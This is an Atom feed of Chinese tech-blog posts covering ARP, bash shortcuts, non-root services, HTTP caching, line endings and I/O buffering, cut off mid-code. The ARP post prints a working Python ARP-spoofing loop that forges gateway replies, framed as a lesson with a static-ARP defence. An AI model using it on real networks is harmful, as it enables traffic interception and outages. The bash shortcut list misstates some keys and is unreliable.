<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom"><title>- misc</title><link href="https://lovedboy.github.io/" rel="alternate"></link><link href="https://lovedboy.github.io/feeds/misc.atom.xml" rel="self"></link><id>https://lovedboy.github.io/</id><updated>1970-01-01T00:00:00+08:00</updated><entry><title>arp</title><link href="https://lovedboy.github.io/blog/1970/01/01/arp.html" rel="alternate"></link><published>1970-01-01T00:00:00+08:00</published><updated>1970-01-01T00:00:00+08:00</updated><author><name>lovedb0y</name></author><id>tag:lovedboy.github.io,1970-01-01:/blog/1970/01/01/arp.html</id><summary type="html">&lt;h3&gt;ARP&lt;/h3&gt;
&lt;p&gt;在以太网协议中规定，同一局域网中的一台主机要和另一台主机进行直接通信，必须要知道目标主机的MAC地址。
而在TCP/IP协议中，网络层和传输层只关心目标主机的IP地址。根据目的主机的IP地址，获得其MAC地址。这就是ARP协议要做的事情。&lt;/p&gt;
&lt;h3&gt;ARP的两个特性&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;query包是广播的&lt;/li&gt;
&lt;li&gt;reply包是可以伪造的&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;ARP 攻击&lt;/h3&gt;
&lt;p&gt;基于这两个特点衍生了ARP欺骗攻击，此种攻击可让攻击者获取局域网上的数据包甚至可篡改数据包，且可让网络上特定电脑或所有电脑无法正常连接。&lt;/p&gt;
&lt;p&gt;看下面这个简单的arp欺骗程序：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;def hack(hack_ip, gate_way_ip):

    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
    sock.bind((&amp;quot;p3p1&amp;quot;, socket.SOCK_RAW))
    # sock.bind((&amp;quot;en0&amp;quot;, socket.SOCK_RAW))

    # 模拟网关发出arp应答
    sender_ip = pack(&amp;#39;!4B&amp;#39;, *[int(x) for …&lt;/pre&gt;&lt;/div&gt;</summary><content type="html">&lt;h3&gt;ARP&lt;/h3&gt;
&lt;p&gt;在以太网协议中规定，同一局域网中的一台主机要和另一台主机进行直接通信，必须要知道目标主机的MAC地址。
而在TCP/IP协议中，网络层和传输层只关心目标主机的IP地址。根据目的主机的IP地址，获得其MAC地址。这就是ARP协议要做的事情。&lt;/p&gt;
&lt;h3&gt;ARP的两个特性&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;query包是广播的&lt;/li&gt;
&lt;li&gt;reply包是可以伪造的&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;ARP 攻击&lt;/h3&gt;
&lt;p&gt;基于这两个特点衍生了ARP欺骗攻击，此种攻击可让攻击者获取局域网上的数据包甚至可篡改数据包，且可让网络上特定电脑或所有电脑无法正常连接。&lt;/p&gt;
&lt;p&gt;看下面这个简单的arp欺骗程序：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;def hack(hack_ip, gate_way_ip):

    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
    sock.bind((&amp;quot;p3p1&amp;quot;, socket.SOCK_RAW))
    # sock.bind((&amp;quot;en0&amp;quot;, socket.SOCK_RAW))

    # 模拟网关发出arp应答
    sender_ip = pack(&amp;#39;!4B&amp;#39;, *[int(x) for x in gate_way_ip.split(&amp;#39;.&amp;#39;)])
    target_ip = pack(&amp;#39;!4B&amp;#39;, *[int(x) for x in hack_ip.split(&amp;#39;.&amp;#39;)])
    sender_mac = pack(&amp;#39;!6B&amp;#39;, *(0x11,)*6)#伪造的mac地址
    target_mac = pack(&amp;#39;!6B&amp;#39;, *(int(item, 16) for item in get_ip_mac(hack_ip).split(&amp;quot;:&amp;quot;)))

    count = 0
    arpframe = [
        # ## ETHERNET
        # destination MAC addr
        target_mac,
        # source MAC addr
        sender_mac,

        ETHERNET_PROTOCOL_TYPE_ARP,

        # ## ARP
        ARP_PROTOCOL_TYPE_ETHERNET_IP,
        # operation type
        ARPOP_REPLY,
        # sender MAC addr
        sender_mac,
        # sender IP addr
        sender_ip,
        # target hardware addr
        target_mac,
        # target IP addr
        target_ip,
    ]

    # send the ARP
    while 1:
        sock.send(&amp;#39;&amp;#39;.join(arpframe))
        count += 1
        sys.stdout.write(&amp;quot;\r 发送了{}个arp包&amp;quot;.format(count))
        time.sleep(0.3)
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;a href="https://gist.github.com/lovedboy/a7297554dad4afd8b2d5"&gt;完整代码&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;防御方法&lt;/h3&gt;
&lt;p&gt;网络内的每台电脑的ARP一律改用静态的方式。&lt;/p&gt;</content></entry><entry><title>bash快捷键</title><link href="https://lovedboy.github.io/blog/1970/01/01/bashkuai-jie-jian.html" rel="alternate"></link><published>1970-01-01T00:00:00+08:00</published><updated>1970-01-01T00:00:00+08:00</updated><author><name>lovedb0y</name></author><id>tag:lovedboy.github.io,1970-01-01:/blog/1970/01/01/bashkuai-jie-jian.html</id><summary type="html">&lt;h3&gt;移动&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;ctrl+b&lt;/code&gt;: 前移一个字符(backward)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ctrl+f&lt;/code&gt;: 后移一个字符(forward)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ctrl+a&lt;/code&gt;: 行首字母&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ctrl+b&lt;/code&gt;: 行尾&lt;/li&gt;
&lt;li&gt;&lt;code&gt;alt+b&lt;/code&gt;: 前移一个单词&lt;/li&gt;
&lt;li&gt;&lt;code&gt;alt+a&lt;/code&gt;: 后移一个单词&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;编辑&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;ctrl+h&lt;/code&gt;: 删除光标前一个字符&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ctrl+d&lt;/code&gt;: 删除光标所在字符&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ctrl+w&lt;/code&gt;: 删除当前光标到临近左边单词结束&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ctrl+u&lt;/code&gt;: 删除光标到行首所有字符&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ctrl+k&lt;/code&gt;: 删除光标到行尾所有字符&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ctrl+l&lt;/code&gt;: 清屏&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;其他&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;ctrl+p&lt;/code&gt;: 显示上一条命令&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ctrl+n&lt;/code&gt;: 显示下一条命令&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ctrl+j&lt;/code&gt;: 回车键 …&lt;/li&gt;&lt;/ul&gt;</summary><content type="html">&lt;h3&gt;移动&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;ctrl+b&lt;/code&gt;: 前移一个字符(backward)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ctrl+f&lt;/code&gt;: 后移一个字符(forward)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ctrl+a&lt;/code&gt;: 行首字母&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ctrl+b&lt;/code&gt;: 行尾&lt;/li&gt;
&lt;li&gt;&lt;code&gt;alt+b&lt;/code&gt;: 前移一个单词&lt;/li&gt;
&lt;li&gt;&lt;code&gt;alt+a&lt;/code&gt;: 后移一个单词&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;编辑&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;ctrl+h&lt;/code&gt;: 删除光标前一个字符&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ctrl+d&lt;/code&gt;: 删除光标所在字符&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ctrl+w&lt;/code&gt;: 删除当前光标到临近左边单词结束&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ctrl+u&lt;/code&gt;: 删除光标到行首所有字符&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ctrl+k&lt;/code&gt;: 删除光标到行尾所有字符&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ctrl+l&lt;/code&gt;: 清屏&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;其他&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;ctrl+p&lt;/code&gt;: 显示上一条命令&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ctrl+n&lt;/code&gt;: 显示下一条命令&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ctrl+j&lt;/code&gt;: 回车键&lt;/li&gt;
&lt;/ul&gt;</content></entry><entry><title>非root启动应用</title><link href="https://lovedboy.github.io/blog/1970/01/01/fei-rootqi-dong-ying-yong.html" rel="alternate"></link><published>1970-01-01T00:00:00+08:00</published><updated>1970-01-01T00:00:00+08:00</updated><author><name>lovedb0y</name></author><id>tag:lovedboy.github.io,1970-01-01:/blog/1970/01/01/fei-rootqi-dong-ying-yong.html</id><summary type="html">&lt;p&gt;今天Redis又被爆出了&lt;a href="http://zone.wooyun.org/content/23858"&gt;漏洞&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;利用场景是Redis开启了外网访问，没有加认证。如果是以root启动的话，就可以拿下系统了。&lt;/p&gt;
&lt;p&gt;所以不要为了方便，随便&lt;strong&gt; 用root身份或者有sudo权限的用户启动应用 &lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;恩，一个有追求的运维或者开发人员不应该用root启动应用。:)&lt;/p&gt;
&lt;p&gt;怎样方便的用非root用户启动应用呢？&lt;/p&gt;
&lt;p&gt;有下面两种简单方法：&lt;/p&gt;
&lt;p&gt;1，setuid，如果你的服务是用daemon程序，推荐用这种方法。&lt;/p&gt;
&lt;p&gt;2，su -c 'your command' different_user&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@ubuntu:/opt/share/haifang/# id
uid=0(root) gid=0(root) 组=0(root)
root@ubuntu:/opt/share/haifang/style_erp# su -c &amp;#39;id&amp;#39; maxma
uid=1001 …&lt;/pre&gt;&lt;/div&gt;</summary><content type="html">&lt;p&gt;今天Redis又被爆出了&lt;a href="http://zone.wooyun.org/content/23858"&gt;漏洞&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;利用场景是Redis开启了外网访问，没有加认证。如果是以root启动的话，就可以拿下系统了。&lt;/p&gt;
&lt;p&gt;所以不要为了方便，随便&lt;strong&gt; 用root身份或者有sudo权限的用户启动应用 &lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;恩，一个有追求的运维或者开发人员不应该用root启动应用。:)&lt;/p&gt;
&lt;p&gt;怎样方便的用非root用户启动应用呢？&lt;/p&gt;
&lt;p&gt;有下面两种简单方法：&lt;/p&gt;
&lt;p&gt;1，setuid，如果你的服务是用daemon程序，推荐用这种方法。&lt;/p&gt;
&lt;p&gt;2，su -c 'your command' different_user&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@ubuntu:/opt/share/haifang/# id
uid=0(root) gid=0(root) 组=0(root)
root@ubuntu:/opt/share/haifang/style_erp# su -c &amp;#39;id&amp;#39; maxma
uid=1001(maxma) gid=1001(maxma) 组=1001(maxma)
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;如果用户没有登录shell，可以使用&lt;code&gt;-s&lt;/code&gt; 去指定运行的shell程序。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;su -s /bin/bash -c '/path/to/your/script' testuser&lt;/code&gt;&lt;/p&gt;</content></entry><entry><title>http缓存</title><link href="https://lovedboy.github.io/blog/1970/01/01/httphuan-cun.html" rel="alternate"></link><published>1970-01-01T00:00:00+08:00</published><updated>1970-01-01T00:00:00+08:00</updated><author><name>lovedb0y</name></author><id>tag:lovedboy.github.io,1970-01-01:/blog/1970/01/01/httphuan-cun.html</id><summary type="html">&lt;h3&gt;ETag&lt;/h3&gt;
&lt;p&gt;服务器生成并返回一个随机Etag，通常是文件内容的哈希值或者某个其他指纹码。客户端不必了解指纹码是如何生成的，只需要在下一个请求中将其发送给服务器：如果指纹码仍然一致，说明资源未被修改，服务器可以直接返回304从而让客户端跳过下载。&lt;/p&gt;
&lt;p&gt;服务器返回的Etag是 &lt;em&gt;1507311446&lt;/em&gt;   状态码是200&lt;/p&gt;
&lt;p&gt;&lt;img alt="etag1" src="http://ww3.sinaimg.cn/large/79565610gw1eulyjirfsdj21800c7acp.jpg"&gt;&lt;/p&gt;
&lt;p&gt;刷新页面，浏览器if-None-Match带的上次服务器返回的Etag &lt;em&gt;1507311446&lt;/em&gt; ，服务器生成的Etag还是这个，直接返回304给浏览器。&lt;/p&gt;
&lt;p&gt;&lt;img alt="etag2" src="http://ww2.sinaimg.cn/large/79565610gw1eulyjuauefj217p0bldic.jpg"&gt;&lt;/p&gt;
&lt;h3&gt;Cache-Control&lt;/h3&gt;
&lt;p&gt;Etag是弊端是每次都要向服务器发送请求。最好是不与服务器进行通信的请求：通过响应的本地副本，避免所有的网络延迟以及数据传输的数据成本。
这就是Cache-Control的作用。Cache-Control有很多设置，具体可以谷歌下。&lt;/p&gt;
&lt;p&gt;第一次请求，服务器设置了Cache-Control:max-age=60，意思是：60S内可以取本地副本。&lt;/p&gt;
&lt;p&gt;&lt;img alt="cache-control1" src="http://ww1.sinaimg.cn/large/79565610gw1eulz8zh9dej218n0cgmzt.jpg"&gt;&lt;/p&gt;
&lt;p&gt;新建标签页再次请求，可以看到&lt;em&gt;from cache&lt;/em&gt; 字样。注意：如果使用的是刷新，浏览器会无视Cache-Control的设置继续向服务器请求。&lt;/p&gt;
&lt;p&gt;&lt;img alt="cache-control2" src="http://ww3.sinaimg.cn/large/79565610gw1eulz9dc5vaj217g0di76e.jpg"&gt;&lt;/p&gt;
&lt;h3&gt;Expires&lt;/h3&gt;
&lt;p&gt;在HTTP 1.1已经被Cache-Control代替了。可以不用考虑了。&lt;/p&gt;
&lt;h3&gt;Last-Modified&lt;/h3&gt;
&lt;p&gt;和ETag类似，服务器给客户端一个资源的最后修改时间。客户端浏览器下次请求就会带上&lt;code&gt;If-Modified-Since&lt;/code&gt;，就是上一次从服务器给的日期。服务器判断如果文件没有发生变更就返回304 …&lt;/p&gt;</summary><content type="html">&lt;h3&gt;ETag&lt;/h3&gt;
&lt;p&gt;服务器生成并返回一个随机Etag，通常是文件内容的哈希值或者某个其他指纹码。客户端不必了解指纹码是如何生成的，只需要在下一个请求中将其发送给服务器：如果指纹码仍然一致，说明资源未被修改，服务器可以直接返回304从而让客户端跳过下载。&lt;/p&gt;
&lt;p&gt;服务器返回的Etag是 &lt;em&gt;1507311446&lt;/em&gt;   状态码是200&lt;/p&gt;
&lt;p&gt;&lt;img alt="etag1" src="http://ww3.sinaimg.cn/large/79565610gw1eulyjirfsdj21800c7acp.jpg"&gt;&lt;/p&gt;
&lt;p&gt;刷新页面，浏览器if-None-Match带的上次服务器返回的Etag &lt;em&gt;1507311446&lt;/em&gt; ，服务器生成的Etag还是这个，直接返回304给浏览器。&lt;/p&gt;
&lt;p&gt;&lt;img alt="etag2" src="http://ww2.sinaimg.cn/large/79565610gw1eulyjuauefj217p0bldic.jpg"&gt;&lt;/p&gt;
&lt;h3&gt;Cache-Control&lt;/h3&gt;
&lt;p&gt;Etag是弊端是每次都要向服务器发送请求。最好是不与服务器进行通信的请求：通过响应的本地副本，避免所有的网络延迟以及数据传输的数据成本。
这就是Cache-Control的作用。Cache-Control有很多设置，具体可以谷歌下。&lt;/p&gt;
&lt;p&gt;第一次请求，服务器设置了Cache-Control:max-age=60，意思是：60S内可以取本地副本。&lt;/p&gt;
&lt;p&gt;&lt;img alt="cache-control1" src="http://ww1.sinaimg.cn/large/79565610gw1eulz8zh9dej218n0cgmzt.jpg"&gt;&lt;/p&gt;
&lt;p&gt;新建标签页再次请求，可以看到&lt;em&gt;from cache&lt;/em&gt; 字样。注意：如果使用的是刷新，浏览器会无视Cache-Control的设置继续向服务器请求。&lt;/p&gt;
&lt;p&gt;&lt;img alt="cache-control2" src="http://ww3.sinaimg.cn/large/79565610gw1eulz9dc5vaj217g0di76e.jpg"&gt;&lt;/p&gt;
&lt;h3&gt;Expires&lt;/h3&gt;
&lt;p&gt;在HTTP 1.1已经被Cache-Control代替了。可以不用考虑了。&lt;/p&gt;
&lt;h3&gt;Last-Modified&lt;/h3&gt;
&lt;p&gt;和ETag类似，服务器给客户端一个资源的最后修改时间。客户端浏览器下次请求就会带上&lt;code&gt;If-Modified-Since&lt;/code&gt;，就是上一次从服务器给的日期。服务器判断如果文件没有发生变更就返回304。&lt;/p&gt;
&lt;p&gt;参考:&lt;/p&gt;
&lt;p&gt;&lt;a href="https://developers.google.com/web/fundamentals/performance/optimizing-content-efficiency/http-caching?hl=zh-cn#cache-control"&gt;https://developers.google.com/web/fundamentals/performance/optimizing-content-efficiency/http-caching?hl=zh-cn#cache-control&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href="http://www.cnblogs.com/kaima/archive/2009/10/13/1582337.html"&gt;http://www.cnblogs.com/kaima/archive/2009/10/13/1582337.html&lt;/a&gt;&lt;/p&gt;</content></entry><entry><title>回车换行</title><link href="https://lovedboy.github.io/blog/1970/01/01/hui-che-huan-xing.html" rel="alternate"></link><published>1970-01-01T00:00:00+08:00</published><updated>1970-01-01T00:00:00+08:00</updated><author><name>lovedb0y</name></author><id>tag:lovedboy.github.io,1970-01-01:/blog/1970/01/01/hui-che-huan-xing.html</id><summary type="html">&lt;p&gt;现在才知道回车和换行是两个独立的概念。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Carriage Return(CR)，也即回车，它在ASCII表中的值为0x0D，可以用转义符\r表示。&lt;/li&gt;
&lt;li&gt;Line Feed(LF)，也即换行，它在ASCII表中的值为0x0A，可以用转义符\n表示。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;来自:&lt;a href="http://www.ruanyifeng.com/blog/2006/04/post_213.html"&gt;http://www.ruanyifeng.com/blog/2006/04/post_213.html&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;在计算机还没有出现之前，有一种叫做电传打字机（Teletype Model 33）的玩意，每秒钟可以打10个字符。但是它有一个问题，就是打完一行换行的时候，要用去0.2秒，正好可以打两个字符。要是在这0.2秒里面，又有新的字符传过来，那么这个字符将丢失。
于是，研制人员想了个办法解决这个问题，就是在每行后面加两个表示结束的字符。一个叫做"回车"，告诉打字机把打印头定位在左边界；另一个叫做"换行"，告诉打字机把纸向下移一行 …&lt;/p&gt;&lt;/blockquote&gt;</summary><content type="html">&lt;p&gt;现在才知道回车和换行是两个独立的概念。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Carriage Return(CR)，也即回车，它在ASCII表中的值为0x0D，可以用转义符\r表示。&lt;/li&gt;
&lt;li&gt;Line Feed(LF)，也即换行，它在ASCII表中的值为0x0A，可以用转义符\n表示。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;来自:&lt;a href="http://www.ruanyifeng.com/blog/2006/04/post_213.html"&gt;http://www.ruanyifeng.com/blog/2006/04/post_213.html&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;在计算机还没有出现之前，有一种叫做电传打字机（Teletype Model 33）的玩意，每秒钟可以打10个字符。但是它有一个问题，就是打完一行换行的时候，要用去0.2秒，正好可以打两个字符。要是在这0.2秒里面，又有新的字符传过来，那么这个字符将丢失。
于是，研制人员想了个办法解决这个问题，就是在每行后面加两个表示结束的字符。一个叫做"回车"，告诉打字机把打印头定位在左边界；另一个叫做"换行"，告诉打字机把纸向下移一行。
这就是"换行"和"回车"的来历，从它们的英语名字上也可以看出一二。
后来，计算机发明了，这两个概念也就被般到了计算机上。那时，存储器很贵，一些科学家认为在每行结尾加两个字符太浪费了，加一个就可以。于是，就出现了分歧。
Unix系统里，每行结尾只有"&amp;lt;换行&amp;gt;"，即"\n"；Windows系统里面，每行结尾是"&amp;lt;回车&amp;gt;&amp;lt;换行&amp;gt;"，即"\r\n"；Mac系统里，每行结尾是"&amp;lt;回车&amp;gt;"。一个直接后果是，Unix/Mac系统下的文件在Windows里打开的话，所有文字会变成一行；而Windows里的文件在Unix/Mac下打开的话，在每行的结尾可能会多出一个^M符号。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;其实回车和换行的真正来源是机械英文打字机。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;"车"指的是纸车,带着纸一起左右移动的模块。当开始打第一个字之前，要把纸车拉到最右边，上紧弹簧。随着打字，弹簧把纸车拉回去。每当打完一行后，纸车就完全收回去了，所以叫回车。换行的概念就是 : 打字机左边有个"把手 ",往下扳动一下,纸会上移一行。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;上面的场景在电影里面应该经常看到。&lt;/p&gt;
&lt;p&gt;另外一位网友整理的文章也值得一看&lt;a href="http://feihu.me/blog/2014/end-of-line/#section-5"&gt;http://feihu.me/blog/2014/end-of-line/#section-5&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;我们在终端打印进度条的时候会用到回车符，将光标移到行首。看下面这个程序：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;#coding:utf-8&lt;/span&gt;
&lt;span class="c1"&gt;# http://stackoverflow.com/questions/3173320/text-progress-bar-in-the-console&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;sys&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;time&lt;/span&gt;

&lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;
&lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;time&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sleep&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mf"&gt;0.3&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
    &lt;span class="c1"&gt;#sys.stdout.write(&amp;quot;\r{}&amp;quot;.format(i))&lt;/span&gt;
    &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\r&lt;/span&gt;&lt;span class="s2"&gt; [{0}] {1}%&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;#&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
    &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;stdout&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;flush&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;img alt="" src="http://ww1.sinaimg.cn/large/79565610gw1ewwgs1ttd2g20fl02adga.gif"&gt;&lt;/p&gt;
&lt;p&gt;同时推荐这个动画制作软件&lt;a href="http://www.cockos.com/licecap/"&gt;http://www.cockos.com/licecap/&lt;/a&gt;&lt;/p&gt;</content></entry><entry><title>IO buffer</title><link href="https://lovedboy.github.io/blog/1970/01/01/io-buffer.html" rel="alternate"></link><published>1970-01-01T00:00:00+08:00</published><updated>1970-01-01T00:00:00+08:00</updated><author><name>lovedb0y</name></author><id>tag:lovedboy.github.io,1970-01-01:/blog/1970/01/01/io-buffer.html</id><summary type="html">&lt;p&gt;同事：为什么代码里面的输出，在log文件里面没看到呢？&lt;/p&gt;
&lt;p&gt;我：你用的是print，不是用logging输出的日志吧。&lt;/p&gt;
&lt;p&gt;同事：是的。&lt;/p&gt;
&lt;p&gt;我：你改成用logging输出。&lt;/p&gt;
&lt;p&gt;看过《UNIX环境高级编程》的同学应该知道，标准I/O库是带缓存的I/O，目的是减少调用read和write的次数。&lt;/p&gt;
&lt;p&gt;典型的以空间换时间思维。：）   &lt;/p&gt;
&lt;p&gt;输入流、输出流默认都是有buffer，错误流默认是unbuffer。如果输出流是到终端，默认是line buffer。  &lt;/p&gt;
&lt;p&gt;无缓存IO操作数据流向路径：数据——内核缓存区——磁盘  &lt;br&gt;
标准IO操作数据流向路径：数据——流缓存区——内核缓存区——磁盘&lt;/p&gt;
&lt;p&gt;通过下面的程序验证一下：&lt;/p&gt;
&lt;p&gt;运行命令是: &lt;code&gt;test.py | cat&lt;/code&gt;&lt;/p&gt;
&lt;table class="highlighttable"&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1
2
3
4
5
6&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/usr/bin/env python&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;time …&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;</summary><content type="html">&lt;p&gt;同事：为什么代码里面的输出，在log文件里面没看到呢？&lt;/p&gt;
&lt;p&gt;我：你用的是print，不是用logging输出的日志吧。&lt;/p&gt;
&lt;p&gt;同事：是的。&lt;/p&gt;
&lt;p&gt;我：你改成用logging输出。&lt;/p&gt;
&lt;p&gt;看过《UNIX环境高级编程》的同学应该知道，标准I/O库是带缓存的I/O，目的是减少调用read和write的次数。&lt;/p&gt;
&lt;p&gt;典型的以空间换时间思维。：）   &lt;/p&gt;
&lt;p&gt;输入流、输出流默认都是有buffer，错误流默认是unbuffer。如果输出流是到终端，默认是line buffer。  &lt;/p&gt;
&lt;p&gt;无缓存IO操作数据流向路径：数据——内核缓存区——磁盘  &lt;br&gt;
标准IO操作数据流向路径：数据——流缓存区——内核缓存区——磁盘&lt;/p&gt;
&lt;p&gt;通过下面的程序验证一下：&lt;/p&gt;
&lt;p&gt;运行命令是: &lt;code&gt;test.py | cat&lt;/code&gt;&lt;/p&gt;
&lt;table class="highlighttable"&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1
2
3
4
5
6&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/usr/bin/env python&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;time&lt;/span&gt;

&lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;hello,world&amp;quot;&lt;/span&gt;
    &lt;span class="n"&gt;time&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sleep&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;

&lt;p&gt;如果我要在cat命令后面实时看到输出怎么办呢？用fflush清空buffer或者调用setvbuf来设置buffer大小。&lt;/p&gt;
&lt;p&gt;Python中你可以用sys.stdout.flush()来清空print的buffer。&lt;/p&gt;
&lt;p&gt;当然你可以用不带buffer的write函数。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;

&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(){&lt;/span&gt;

    &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
